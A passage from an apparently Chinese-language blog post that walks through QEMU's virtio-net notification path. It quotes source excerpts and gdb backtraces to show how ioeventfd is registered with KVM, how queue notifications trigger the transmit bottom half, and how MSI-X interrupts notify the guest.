memory_region_ioeventfd_before(&amp;fds_new[inew],</span><br><span class="line">                                                         &amp;fds_old[iold]))) &#123;</span><br><span class="line">            fd = &amp;fds_new[inew];</span><br><span class="line">            section = (MemoryRegionSection) &#123;</span><br><span class="line">                .fv = address_space_to_flatview(as),</span><br><span class="line">                .offset_within_address_space = int128_get64(fd-&gt;addr.start),</span><br><span class="line">                .size = fd-&gt;addr.size,</span><br><span class="line">            &#125;;</span><br><span class="line">            MEMORY_LISTENER_CALL(as, eventfd_add, Reverse, &amp;section,</span><br><span class="line">                                 fd-&gt;match_data, fd-&gt;data, fd-&gt;e);</span><br><span class="line">            ++inew;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            ++iold;</span><br><span class="line">            ++inew;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">kvm_mem_ioeventfd_add</span><span class="params">(MemoryListener *listener,</span></span><br><span class="line"><span class="params">                                  MemoryRegionSection *section,</span></span><br><span class="line"><span class="params">                                  <span class="type">bool</span> match_data, <span class="type">uint64_t</span> data,</span></span><br><span class="line"><span class="params">                                  EventNotifier *e)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> fd = event_notifier_get_fd(e);</span><br><span class="line">    <span class="type">int</span> r;</span><br><span class="line"></span><br><span class="line">    r = kvm_set_ioeventfd_mmio(fd, section-&gt;offset_within_address_space,</span><br><span class="line">                               data, <span class="literal">true</span>, int128_get64(section-&gt;size),</span><br><span class="line">                               match_data);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">event_notifier_get_fd</span><span class="params">(<span class="type">const</span> EventNotifier *e)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> e-&gt;rfd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">kvm_set_ioeventfd_mmio</span><span class="params">(<span class="type">int</span> fd, hwaddr addr, <span class="type">uint32_t</span> val,</span></span><br><span class="line"><span class="params">                                  <span class="type">bool</span> assign, <span class="type">uint32_t</span> size, <span class="type">bool</span> datamatch)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kvm_ioeventfd</span> <span class="title">iofd</span> =</span> &#123;</span><br><span class="line">        .datamatch = datamatch ? adjust_ioeventfd_endianness(val, size) : <span class="number">0</span>,</span><br><span class="line">        .addr = addr,</span><br><span class="line">        .len = size,</span><br><span class="line">        .flags = <span class="number">0</span>,</span><br><span class="line">        .fd = fd,</span><br><span class="line">    &#125;;</span><br><span class="line">    ...</span><br><span class="line">    ret = kvm_vm_ioctl(kvm_state, KVM_IOEVENTFD, &amp;iofd);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单来说，其在<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/util/event_notifier-posix.c#L35"><strong>event_notifier_init()</strong></a>中调用<strong>eventfd</strong>系统调用并获取对应的文件描述符，然后在<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/accel/kvm/kvm-all.c#L1647"><strong>kvm_mem_ioeventfd_add()</strong></a>中将该文件描述符通过<strong>ioctl</strong>传递给<strong>kvm内核模块</strong>，后续<strong>kvm内核模块</strong>可以唤醒被阻塞的用于轮询的<strong>virtio设备</strong>的任务，完成<strong>guest</strong>通知<strong>virtio设备</strong></p><p>下面分析一下<strong>virtio设备</strong>如何将<strong>eventfd</strong>的文件描述符绑定到等待线程任务上的，其相关代码如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//#0  aio_set_event_notifier (ctx=0x5555570ea810, notifier=0x5555580ca6e4, io_read=0x555555deed70 &lt;virtio_queue_host_notifier_read&gt;, io_poll=0x0, io_poll_ready=0x0) at ../../qemu/util/aio-posix.c:201</span></span><br><span class="line"><span class="comment">//#1  0x00005555560ce889 in event_notifier_set_handler (e=0x5555580ca6e4, handler=0x555555deed70 &lt;virtio_queue_host_notifier_read&gt;) at ../../qemu/util/main-loop.c:652</span></span><br><span class="line"><span class="comment">//#2  0x0000555555def4b1 in virtio_device_start_ioeventfd_impl (vdev=0x5555580b8df0) at ../../qemu/hw/virtio/virtio.c:3838</span></span><br><span class="line"><span class="comment">//#3  0x0000555555b6dd54 in virtio_bus_start_ioeventfd (bus=0x5555580b8d70) at ../../qemu/hw/virtio/virtio-bus.c:236</span></span><br><span class="line"><span class="comment">//#4  0x0000555555b6f952 in virtio_pci_start_ioeventfd (proxy=0x5555580b0900) at ../../qemu/hw/virtio/virtio-pci.c:375</span></span><br><span class="line"><span class="comment">//#5  0x0000555555b72cae in virtio_pci_common_write (opaque=0x5555580b0900, addr=20, val=15, size=1) at ../../qemu/hw/virtio/virtio-pci.c:1732</span></span><br><span class="line"><span class="comment">//#6  0x0000555555e19a00 in memory_region_write_accessor (mr=0x5555580b1440, addr=20, value=0x7ffff5bff5d8, size=1, shift=0, mask=255, attrs=...) at ../../qemu/system/memory.c:497</span></span><br><span class="line"><span class="comment">//#7  0x0000555555e19d39 in access_with_adjusted_size (addr=20, value=0x7ffff5bff5d8, size=1, access_size_min=1, access_size_max=4, access_fn=0x555555e19906 &lt;memory_region_write_accessor&gt;, mr=0x5555580b1440, attrs=...) at ../../qemu/system/memory.c:573</span></span><br><span class="line"><span class="comment">//#8  0x0000555555e1d053 in memory_region_dispatch_write (mr=0x5555580b1440, addr=20, data=15, op=MO_8, attrs=...) at ../../qemu/system/memory.c:1521</span></span><br><span class="line"><span class="comment">//#9  0x0000555555e2b7a0 in flatview_write_continue_step (attrs=..., buf=0x7ffff7f86028 &quot;\017\020&quot;, len=1, mr_addr=20, l=0x7ffff5bff6c0, mr=0x5555580b1440) at ../../qemu/system/physmem.c:2713</span></span><br><span class="line"><span class="comment">//#10 0x0000555555e2b870 in flatview_write_continue (fv=0x7ffee0040190, addr=30786325577748, attrs=..., ptr=0x7ffff7f86028, len=1, mr_addr=20, l=1, mr=0x5555580b1440) at ../../qemu/system/physmem.c:2743</span></span><br><span class="line"><span class="comment">//#11 0x0000555555e2b982 in flatview_write (fv=0x7ffee0040190, addr=30786325577748, attrs=..., buf=0x7ffff7f86028, len=1) at ../../qemu/system/physmem.c:2774</span></span><br><span class="line"><span class="comment">//#12 0x0000555555e2bdd0 in address_space_write (as=0x55555704dce0 &lt;address_space_memory&gt;, addr=30786325577748, attrs=..., buf=0x7ffff7f86028, len=1) at ../../qemu/system/physmem.c:2894</span></span><br><span class="line"><span class="comment">//#13 0x0000555555e2be4c in address_space_rw (as=0x55555704dce0 &lt;address_space_memory&gt;, addr=30786325577748, attrs=..., buf=0x7ffff7f86028, len=1, is_write=true) at ../../qemu/system/physmem.c:2904</span></span><br><span class="line"><span class="comment">//#14 0x0000555555e85e36 in kvm_cpu_exec (cpu=0x5555573e72d0) at ../../qemu/accel/kvm/kvm-all.c:2912</span></span><br><span class="line"><span class="comment">//#15 0x0000555555e88eb8 in kvm_vcpu_thread_fn (arg=0x5555573e72d0) at ../../qemu/accel/kvm/kvm-accel-ops.c:50</span></span><br><span class="line"><span class="comment">//#16 0x00005555560b2687 in qemu_thread_start (args=0x5555573f04a0) at ../../qemu/util/qemu-thread-posix.c:541</span></span><br><span class="line"><span class="comment">//#17 0x00007ffff7894ac3 in start_thread (arg=&lt;optimized out&gt;) at ./nptl/pthread_create.c:442</span></span><br><span class="line"><span class="comment">//#18 0x00007ffff7926850 in clone3 () at ../sysdeps/unix/sysv/linux/x86_64/clone3.S:81</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">event_notifier_set_handler</span><span class="params">(EventNotifier *e,</span></span><br><span class="line"><span class="params">                                EventNotifierHandler *handler)</span></span><br><span class="line">&#123;</span><br><span class="line">    iohandler_init();</span><br><span class="line">    aio_set_event_notifier(iohandler_ctx, e, handler, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">aio_set_event_notifier</span><span class="params">(AioContext *ctx,</span></span><br><span class="line"><span class="params">                            EventNotifier *notifier,</span></span><br><span class="line"><span class="params">                            EventNotifierHandler *io_read,</span></span><br><span class="line"><span class="params">                            AioPollFn *io_poll,</span></span><br><span class="line"><span class="params">                            EventNotifierHandler *io_poll_ready)</span></span><br><span class="line">&#123;</span><br><span class="line">    aio_set_fd_handler(ctx, event_notifier_get_fd(notifier),</span><br><span class="line">                       (IOHandler *)io_read, <span class="literal">NULL</span>, io_poll,</span><br><span class="line">                       (IOHandler *)io_poll_ready, notifier);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看到，其在<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/util/main-loop.c#L648"><strong>event_notifier_set_handler</strong></a>中将<strong>eventfd</strong>的文件描述符绑定到<strong>io-handler</strong>任务上，并注册<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/virtio/virtio.c#L3667"><strong>virtio_queue_host_notifier_read()</strong></a>为对应的<strong>read</strong>回调函数，即当<strong>kvm内核模块</strong>唤醒等待线程时，<strong>qemu</strong>会执行如下的回调函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//#0  virtio_net_handle_tx_bh (vdev=0x5555580b8df0, vq=0x5555580ca708) at ../../qemu/hw/net/virtio-net.c:2865</span></span><br><span class="line"><span class="comment">//#1  0x0000555555deb477 in virtio_queue_notify_vq (vq=0x5555580ca708) at ../../qemu/hw/virtio/virtio.c:2268</span></span><br><span class="line"><span class="comment">//#2  0x0000555555deedb0 in virtio_queue_host_notifier_read (n=0x5555580ca77c) at ../../qemu/hw/virtio/virtio.c:3671</span></span><br><span class="line"><span class="comment">//#3  0x00005555560acf67 in aio_dispatch_handler (ctx=0x5555570ea810, node=0x7ffee0c08b20) at ../../qemu/util/aio-posix.c:372</span></span><br><span class="line"><span class="comment">//#4  0x00005555560ad116 in aio_dispatch_handlers (ctx=0x5555570ea810) at ../../qemu/util/aio-posix.c:414</span></span><br><span class="line"><span class="comment">//#5  0x00005555560ad176 in aio_dispatch (ctx=0x5555570ea810) at ../../qemu/util/aio-posix.c:424</span></span><br><span class="line"><span class="comment">//#6  0x00005555560cce95 in aio_ctx_dispatch (source=0x5555570ea810, callback=0x0, user_data=0x0) at ../../qemu/util/async.c:360</span></span><br><span class="line"><span class="comment">//#7  0x00007ffff7b86d3b in g_main_context_dispatch () at /lib/x86_64-linux-gnu/libglib-2.0.so.0</span></span><br><span class="line"><span class="comment">//#8  0x00005555560ce520 in glib_pollfds_poll () at ../../qemu/util/main-loop.c:287</span></span><br><span class="line"><span class="comment">//#9  0x00005555560ce5ab in os_host_main_loop_wait (timeout=79205277539000) at ../../qemu/util/main-loop.c:310</span></span><br><span class="line"><span class="comment">//#10 0x00005555560ce6d7 in main_loop_wait (nonblocking=0) at ../../qemu/util/main-loop.c:589</span></span><br><span class="line"><span class="comment">//#11 0x0000555555bd4e54 in qemu_main_loop () at ../../qemu/system/runstate.c:783</span></span><br><span class="line"><span class="comment">//#12 0x0000555555e96f5b in qemu_default_main () at ../../qemu/system/main.c:37</span></span><br><span class="line"><span class="comment">//#13 0x0000555555e96f9c in main (argc=39, argv=0x7fffffffd9e8) at ../../qemu/system/main.c:48</span></span><br><span class="line"><span class="comment">//#14 0x00007ffff7829d90 in __libc_start_call_main (main=main@entry=0x555555e96f6f &lt;main&gt;, argc=argc@entry=39, argv=argv@entry=0x7fffffffd9e8) at ../sysdeps/nptl/libc_start_call_main.h:58</span></span><br><span class="line"><span class="comment">//#15 0x00007ffff7829e40 in __libc_start_main_impl (main=0x555555e96f6f &lt;main&gt;, argc=39, argv=0x7fffffffd9e8, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7fffffffd9d8) at ../csu/libc-start.c:392</span></span><br><span class="line"><span class="comment">//#16 0x000055555586cc95 in _start ()</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">virtio_queue_host_notifier_read</span><span class="params">(EventNotifier *n)</span></span><br><span class="line">&#123;</span><br><span class="line">    VirtQueue *vq = container_of(n, VirtQueue, host_notifier);</span><br><span class="line">    <span class="keyword">if</span> (event_notifier_test_and_clear(n)) &#123;</span><br><span class="line">        virtio_queue_notify_vq(vq);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">event_notifier_test_and_clear</span><span class="params">(EventNotifier *e)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> value;</span><br><span class="line">    <span class="type">ssize_t</span> len;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">512</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!e-&gt;initialized) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Drain the notify pipe.  For eventfd, only 8 bytes will be read.  */</span></span><br><span class="line">    value = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        len = read(e-&gt;rfd, buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">        value |= (len &gt; <span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">while</span> ((len == <span class="number">-1</span> &amp;&amp; errno == EINTR) || len == <span class="keyword">sizeof</span>(buffer));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">virtio_queue_notify_vq</span><span class="params">(VirtQueue *vq)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (vq-&gt;vring.desc &amp;&amp; vq-&gt;handle_output) &#123;</span><br><span class="line">        VirtIODevice *vdev = vq-&gt;vdev;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (unlikely(vdev-&gt;broken)) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        trace_virtio_queue_notify(vdev, vq - vdev-&gt;vq, vq);</span><br><span class="line">        vq-&gt;handle_output(vdev, vq);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (unlikely(vdev-&gt;start_on_kick)) &#123;</span><br><span class="line">            virtio_set_started(vdev, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">virtio_net_handle_tx_bh</span><span class="params">(VirtIODevice *vdev, VirtQueue *vq)</span></span><br><span class="line">&#123;</span><br><span class="line">    VirtIONet *n = VIRTIO_NET(vdev);</span><br><span class="line">    VirtIONetQueue *q = &amp;n-&gt;vqs[vq2q(virtio_get_queue_index(vq))];</span><br><span class="line">    ...</span><br><span class="line">    virtio_queue_set_notification(vq, <span class="number">0</span>);</span><br><span class="line">    qemu_bh_schedule(q-&gt;tx_bh);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//#0  virtio_net_tx_bh (opaque=0x5555580f06e0) at ../../qemu/hw/net/virtio-net.c:2941</span></span><br><span class="line"><span class="comment">//#1  0x00005555560cc8d9 in aio_bh_call (bh=0x5555580c4380) at ../../qemu/util/async.c:171</span></span><br><span class="line"><span class="comment">//#2  0x00005555560cca00 in aio_bh_poll (ctx=0x5555570f0bf0) at ../../qemu/util/async.c:218</span></span><br><span class="line"><span class="comment">//#3  0x00005555560ad16a in aio_dispatch (ctx=0x5555570f0bf0) at ../../qemu/util/aio-posix.c:423</span></span><br><span class="line"><span class="comment">//#4  0x00005555560cce95 in aio_ctx_dispatch (source=0x5555570f0bf0, callback=0x0, user_data=0x0) at ../../qemu/util/async.c:360</span></span><br><span class="line"><span class="comment">//#5  0x00007ffff7b86d3b in g_main_context_dispatch () at /lib/x86_64-linux-gnu/libglib-2.0.so.0</span></span><br><span class="line"><span class="comment">//#6  0x00005555560ce520 in glib_pollfds_poll () at ../../qemu/util/main-loop.c:287</span></span><br><span class="line"><span class="comment">//#7  0x00005555560ce5ab in os_host_main_loop_wait (timeout=0) at ../../qemu/util/main-loop.c:310</span></span><br><span class="line"><span class="comment">//#8  0x00005555560ce6d7 in main_loop_wait (nonblocking=0) at ../../qemu/util/main-loop.c:589</span></span><br><span class="line"><span class="comment">//#9  0x0000555555bd4e54 in qemu_main_loop () at ../../qemu/system/runstate.c:783</span></span><br><span class="line"><span class="comment">//#10 0x0000555555e96f5b in qemu_default_main () at ../../qemu/system/main.c:37</span></span><br><span class="line"><span class="comment">//#11 0x0000555555e96f9c in main (argc=39, argv=0x7fffffffd9e8) at ../../qemu/system/main.c:48</span></span><br><span class="line"><span class="comment">//#12 0x00007ffff7829d90 in __libc_start_call_main (main=main@entry=0x555555e96f6f &lt;main&gt;, argc=argc@entry=39, argv=argv@entry=0x7fffffffd9e8) at ../sysdeps/nptl/libc_start_call_main.h:58</span></span><br><span class="line"><span class="comment">//#13 0x00007ffff7829e40 in __libc_start_main_impl (main=0x555555e96f6f &lt;main&gt;, argc=39, argv=0x7fffffffd9e8, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7fffffffd9d8) at ../csu/libc-start.c:392</span></span><br><span class="line"><span class="comment">//#14 0x000055555586cc95 in _start ()</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">virtio_net_tx_bh</span><span class="params">(<span class="type">void</span> *opaque)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    ret = virtio_net_flush_tx(q);</span><br><span class="line">    <span class="keyword">if</span> (ret == -EBUSY || ret == -EINVAL) &#123;</span><br><span class="line">        <span class="keyword">return</span>; <span class="comment">/* Notification re-enable handled by tx_complete or device</span></span><br><span class="line"><span class="comment">                 * broken */</span></span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>在前面<a href="#实例化">实例化</a>中，其<strong>handle_output</strong>字段在<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/net/virtio-net.c#L2988"><strong>virtio_net_add_queue()</strong></a>中注册为<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/net/virtio-net.c#L2863"><strong>virtio_net_handle_tx_bh()</strong></a>，并将对应的<strong>bottom half</strong>设置为<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/net/virtio-net.c#L2889"><strong>virtio_net_tx_timer()</strong></a></p><p>所以当<strong>kvm内核模块</strong>唤醒等待线程时，<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/virtio/virtio.c#L3667"><strong>virtio_queue_host_notifier_read()</strong></a>被回调，并在<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/net/virtio-net.c#L2863"><strong>virtio_net_handle_tx_bh()</strong></a>中唤醒对应的<strong>bottom half</strong>任务，执行<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/net/virtio-net.c#L2889"><strong>virtio_net_tx_timer()</strong></a>最终处理<strong>virtqueue</strong>中传递的数据</p><h4 id="通知guest"><a href="#通知guest" class="headerlink" title="通知guest"></a>通知guest</h4><p>根据前面<a href="#可用buffer通知">virtio标准</a>小节可知，一般是Qemu注入对应的MSIx中断来通知<strong>guest</strong>，msix中断通知的示意图如下所示<br><img src="msi中断示意图.png" alt="msix中断示意图"></p><p>由于<strong>msix中断</strong>涉及中断虚拟化等多方面的内容，这里不详细分析，只简单介绍一下。</p><p><strong>msix中断</strong>是<strong>pci协议</strong>为了绕过较慢的<strong>ioapic</strong>中断处理器直接将设备中断发送到处理速度更快的<strong>lapic</strong>中断处理器的机制。具体来说，<strong>pci设备</strong>根据PCI设置空间的<strong>msix table</strong>中指定的地址(即<strong>lapic</strong>映射到的地址空间)中写入数据，从而触发<strong>lapic</strong>中断。</p><p>而qemu模拟了该操作，其<strong>msix table</strong>中指定的地址空间属于<strong>apic设备</strong>，该地址的写由对应<strong>MemoryRegion</strong>的回调函数<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/i386/kvm/apic.c#L206"><strong>kvm_apic_mem_write()</strong></a>处理<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//#0  kvm_irqchip_send_msi (s=0x5555570f9160, msg=...) at ../../qemu/accel/kvm/kvm-all.c:1951</span></span><br><span class="line"><span class="comment">//#1  0x0000555555ce262c in kvm_send_msi (msg=0x7fffffff5300) at ../../qemu/hw/i386/kvm/apic.c:193</span></span><br><span class="line"><span class="comment">//#2  0x0000555555ce26d6 in kvm_apic_mem_write (opaque=0x555557276400, addr=4096, data=36, size=4) at ../../qemu/hw/i386/kvm/apic.c:211</span></span><br><span class="line"><span class="comment">//#3  0x0000555555e19a00 in memory_region_write_accessor (mr=0x5555572764a0, addr=4096, value=0x7fffffff5428, size=4, shift=0, mask=4294967295, attrs=...) at ../../qemu/system/memory.c:497</span></span><br><span class="line"><span class="comment">//#4  0x0000555555e19d39 in access_with_adjusted_size (addr=4096, value=0x7fffffff5428, size=4, access_size_min=1, access_size_max=4, access_fn=0x555555e19906 &lt;memory_region_write_accessor&gt;, mr=0x5555572764a0, attrs=...) at ../../qemu/system/memory.c:573</span></span><br><span class="line"><span class="comment">//#5  0x0000555555e1d053 in memory_region_dispatch_write (mr=0x5555572764a0, addr=4096, data=36, op=MO_32, attrs=...) at ../../qemu/system/memory.c:1521</span></span><br><span class="line"><span class="comment">//#6  0x0000555555e2d666 in address_space_stl_internal (as=0x5555580b58e0, addr=4276097024, val=36, attrs=..., result=0x0, endian=DEVICE_LITTLE_ENDIAN) at ../../qemu/system/memory_ldst.c.inc:319</span></span><br><span class="line"><span class="comment">//#7  0x0000555555e2d7c5 in address_space_stl_le (as=0x5555580b58e0, addr=4276097024, val=36, attrs=..., result=0x0) at ../../qemu/system/memory_ldst.c.inc:357</span></span><br><span class="line"><span class="comment">//#8  0x0000555555a96287 in pci_msi_trigger (dev=0x5555580b56a0, msg=...) at ../../qemu/hw/pci/pci.c:364</span></span><br><span class="line"><span class="comment">//#9  0x0000555555a92222 in msi_send_message (dev=0x5555580b56a0, msg=...) at ../../qemu/hw/pci/msi.c:380</span></span><br><span class="line"><span class="comment">//#10 0x0000555555a93f21 in msix_notify (dev=0x5555580b56a0, vector=2) at ../../qemu/hw/pci/msix.c:542</span></span><br><span class="line"><span class="comment">//#11 0x0000555555b6f142 in virtio_pci_notify (d=0x5555580b56a0, vector=2) at ../../qemu/hw/virtio/virtio-pci.c:77</span></span><br><span class="line"><span class="comment">//#12 0x0000555555dea808 in virtio_notify_vector (vdev=0x5555580bdb90, vector=2) at ../../qemu/hw/virtio/virtio.c:2001</span></span><br><span class="line"><span class="comment">//#13 0x0000555555debf63 in virtio_irq (vq=0x5555580e4738) at ../../qemu/hw/virtio/virtio.c:2491</span></span><br><span class="line"><span class="comment">//#14 0x0000555555dec011 in virtio_notify (vdev=0x5555580bdb90, vq=0x5555580e4738) at ../../qemu/hw/virtio/virtio.c:2503</span></span><br><span class="line"><span class="comment">//#15 0x0000555555db2d6b in virtio_net_flush_tx (q=0x5555580cb6f0) at ../../qemu/hw/net/virtio-net.c:2822</span></span><br><span class="line"><span class="comment">//#16 0x0000555555db3271 in virtio_net_tx_bh (opaque=0x5555580cb6f0) at ../../qemu/hw/net/virtio-net.c:2960</span></span><br><span class="line"><span class="comment">//#17 0x00005555560cc8d9 in aio_bh_call (bh=0x5555580c5390) at ../../qemu/util/async.c:171</span></span><br><span class="line"><span class="comment">//#18 0x00005555560cca00 in aio_bh_poll (ctx=0x5555570f0bf0) at ../../qemu/util/async.c:218</span></span><br><span class="line"><span class="comment">//#19 0x00005555560ad16a in aio_dispatch (ctx=0x5555570f0bf0) at ../../qemu/util/aio-posix.c:423</span></span><br><span class="line"><span class="comment">//#20 0x00005555560cce95 in aio_ctx_dispatch (source=0x5555570f0bf0, callback=0x0, user_data=0x0) at ../../qemu/util/async.c:360</span></span><br><span class="line"><span class="comment">//#21 0x00007ffff7b88d3b in g_main_context_dispatch () at /lib/x86_64-linux-gnu/libglib-2.0.so.0</span></span><br><span class="line"><span class="comment">//#22 0x00005555560ce520 in glib_pollfds_poll () at ../../qemu/util/main-loop.c:287</span></span><br><span class="line"><span class="comment">//#23 0x00005555560ce5ab in 